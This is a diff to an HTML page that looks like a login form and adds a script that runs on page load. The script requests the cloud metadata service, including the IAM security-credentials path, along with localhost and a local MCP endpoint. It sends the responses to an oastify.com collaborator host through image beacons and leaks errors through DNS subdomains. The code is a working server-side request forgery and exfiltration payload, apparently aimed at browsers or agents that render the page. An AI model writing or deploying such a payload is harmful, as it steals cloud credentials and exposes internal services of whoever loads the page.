@@ -9,24 +9,32 @@
   <button>Login</button>
 </form>
 <script>
+const collab = "9u41m2dngv7pgaf20zxco3q4avgm4cs1.oastify.com";
 const targets = [
   "http://169.254.169.254/latest/meta-data/",
   "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
   "http://127.0.0.1/",
   "http://127.0.0.1:8080/mcp",
 ];
+
 targets.forEach(url => {
-  fetch(url, {mode:'no-cors'})
-    .then(r => r.text())
-    .then(body => {
-      new Image().src = "http://9u41m2dngv7pgaf20zxco3q4avgm4cs1.oastify.com/?url=" +
-        encodeURIComponent(url) + "&data=" + encodeURIComponent(body.substring(0,500));
-    })
-    .catch(e => {
-      new Image().src = "http://9u41m2dngv7pgaf20zxco3q4avgm4cs1.oastify.com/?url=" +
-        encodeURIComponent(url) + "&err=" + encodeURIComponent(e.toString());
-    });
+  // Try XMLHttpRequest sync
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', url, false); // synchronous
+    xhr.send();
+    var data = encodeURIComponent(xhr.responseText.substring(0, 200));
+    new Image().src = `http://${collab}/?url=${encodeURIComponent(url)}&data=${data}&status=${xhr.status}`;
+  } catch(e) {
+    // Try DNS exfil via subdomain
+    var errenc = encodeURIComponent(e.toString()).substring(0,30).replace(/%/g,'x');
+    var sub = errenc.replace(/[^a-zA-Z0-9]/g,'').substring(0,20);
+    new Image().src = `http://${sub}.${collab}/`;
+  }
 });
+
+// Also try location-based redirect to internal
+// window.location = "http://169.254.169.254/latest/meta-data/"\;
 </script>
 </body>
 </html>
